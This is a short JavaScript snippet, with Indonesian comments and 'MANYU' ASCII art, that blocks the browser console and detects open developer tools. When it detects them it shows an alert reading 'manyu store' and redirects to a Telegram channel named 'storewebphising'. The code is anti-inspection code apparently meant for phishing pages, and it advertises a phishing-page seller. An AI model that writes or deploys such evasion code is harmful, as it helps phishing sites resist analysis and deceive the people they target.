
(function() {
    // Menampilkan ASCII art saat konsol dibuka
    var asciiArt = `
███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
██╔████╔██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
██║╚██╔╝██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
██║░╚═╝░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
    `;

    // Menonaktifkan akses ke console
    Object.defineProperty(window, 'console', {
        get: function() {
            alert('Console diblokir. Anda tidak dapat mengakses console!');
            return {
                log: function() {},
                warn: function() {},
                error: function() {},
                info: function() {}
            };
        }
    });

    // Menambahkan pesan saat Developer Tools dibuka
    var devtools = /./;
    devtools.toString = function() {
        alert('manyu store');
        console.log(asciiArt);
        window.location.href = 'https://t.me/storewebphising';
    };
    console.log(devtools);
})();
